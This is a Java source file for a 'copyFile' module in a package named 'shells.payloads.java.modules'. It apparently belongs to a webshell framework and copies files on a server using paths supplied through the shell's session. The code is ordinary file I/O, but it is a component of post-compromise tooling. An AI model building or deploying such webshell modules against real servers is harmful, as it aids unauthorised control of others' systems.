package shells.payloads.java.modules;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.channels.FileChannel;
import java.util.Map;

public class FileCopyModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String srcFileName = getString("srcFileName");
            String destFileName = getString("destFileName");
            
            if (srcFileName != null && destFileName != null) {
                File srcFile = new File(srcFileName);
                File destFile = new File(destFileName);
                
                if (!srcFile.exists()) {
                    return "Source file does not exist".getBytes();
                }
                
                File parentDir = destFile.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                // JDK 1.6: no try-with-resources.
                FileInputStream fis = null;
                FileOutputStream fos = null;
                try {
                    fis = new FileInputStream(srcFile);
                    fos = new FileOutputStream(destFile);
                    FileChannel srcChannel = fis.getChannel();
                    FileChannel destChannel = fos.getChannel();
                    destChannel.transferFrom(srcChannel, 0, srcChannel.size());
                } finally {
                    if (fis != null) { try { fis.close(); } catch (Exception ignored) {} }
                    if (fos != null) { try { fos.close(); } catch (Exception ignored) {} }
                }
                
                return "ok".getBytes();
            }
            return "Missing srcFileName or destFileName".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "copyFile";
    }
}
